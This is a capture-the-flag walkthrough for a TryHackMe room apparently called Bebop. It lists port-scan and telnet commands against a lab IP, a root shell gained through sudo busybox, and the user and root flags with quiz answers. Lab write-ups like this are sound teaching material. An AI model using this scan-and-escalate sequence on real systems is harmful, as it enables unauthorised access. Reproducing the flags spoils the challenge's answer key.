# Bebop

## Task 1 Takeoff!

#### What is your codename?

{% hint style="success" %}
`pilot`
{% endhint %}

## Task 2 Manoeuvre

#### What is the User Flag?

```bash
rustscan -a 10.10.179.144 -- -n -sVC
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 06-05-10.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 06-05-49.png>)

```bash
telnet 10.10.168.69
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 06-16-54.png>)

{% hint style="success" %}
`THM{r3m0v3_b3f0r3_fl16h7}`
{% endhint %}

#### What is the Root Flag?

```bash
sudo -l
sudo /usr/local/bin/busybox sh
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 06-20-56.png>)

{% hint style="success" %}
THM{h16hw4y\_70\_7h3\_d4n63r\_z0n3}
{% endhint %}

## Task 3 Quiz!

#### What is the low privilleged user?

{% hint style="success" %}
`pilot`
{% endhint %}

#### What binary was used to escalate privillages?

{% hint style="success" %}
`busybox`
{% endhint %}

#### What service was used to gain an initial shell?

{% hint style="success" %}
`telnet`
{% endhint %}

#### What Operating System does the drone run?

{% hint style="success" %}
`FreeBSD`
{% endhint %}
